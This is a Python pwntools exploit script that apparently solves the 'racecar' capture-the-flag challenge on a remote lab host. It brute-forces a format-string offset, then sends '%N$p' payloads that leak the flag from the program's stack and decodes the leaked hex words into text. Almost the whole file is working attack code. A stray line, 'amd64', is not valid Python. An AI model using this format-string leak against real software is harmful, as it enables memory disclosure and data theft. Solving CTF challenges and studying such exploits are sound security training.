import sys
from pwn import *
import subprocess
import time
from tqdm import tqdm

amd64

RHOST = '134.209.22.121'
RPORT = 30460
EXE = "./racecar"

context.log_level = 'INFO'

gdbscript = ''
commands = [
    'break *main',
    'break *car_menu',
    'break *car_menu+772',
    'break *car_menu+878'
    # 'break *car_menu+881'
]
for s in commands:
    gdbscript += s + "\n"

elf = context.binary = ELF(EXE, checksec=False)

if len(sys.argv) != 2:
    sys.exit('[!] Please specify mode')

def connect_binary():
    if sys.argv[1] == 'remote':
        return remote(RHOST, RPORT)
    elif sys.argv[1] == 'gdb': 
        return gdb.debug([EXE], gdbscript=gdbscript)
    elif sys.argv[1] == 'normal':
        return process([EXE])
    else:
        sys.exit('[!] Mode should be GDB, NORMAL or REMOTE')

def get_format_string_offset():
    for offset in range(1,5000):
        io = connect_binary()

        # payload = b'AAAA%' + bytes(str(offset), "utf-8") + b"$p"
        payload = b'AAAA' + b'%x'*offset
        recv = send_payload(io, payload)

        if b'HTB{' in recv:
            print('FOUND')
            return 'FOUND'

        # if b'41' in recv:
        #     for padlen in range(0,4):
        #         if b'41414141' in recv:
        #             io = connect_binary()
        #             payload = b' '*padlen + b'BBBB%' + bytes(str(offset), "utf-8") + b"$p"
        #             print(payload)
        #             recv = send_payload(io, payload)
        #             print(recv)
        #             if b'42424242' in recv:
        #                 log.info('Found offset ({}) and padlen ({})'
        #                          .format(offset, padlen))
        #                 return offset, padlen
        #         else:
        #             io = connect_binary()
        #             payload = b' ' + payload
        #             recv = send_payload(io, payload)



# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
def send_payload(io, payload):
    try:
        io.sendlineafter(b': ', b'John')
        io.sendlineafter(b': ', b'Doe')
        io.sendlineafter(b'> ', b'2')
        io.sendlineafter(b'> ', b'2')
        io.sendlineafter(b'> ', b'1')

        io.sendlineafter(b'> ', payload)
        log.info('Payload send')
        io.recvuntil('this:')
        recv = io.recv().strip()
        io.close()
        return recv
    except EOFError:
        log.error('EOFError with {}'.format(payload))
        return

flag_offset = 12
flag_length = 44
flag_length_hex = flag_length//4
flag_offset_end = flag_offset + flag_length_hex

io = connect_binary()
payload = b''
for i in range(flag_offset, flag_offset_end):
    payload += '%{}$p'.format(i).encode()
flag = send_payload(io, payload)
flag = flag.decode('utf-8').split('\n')[1]
flag = flag.split('0x')[1:]
flag = [p32(int(f, base=16)).decode('utf-8') for f in flag]
for f in flag:
    print(f, end='')
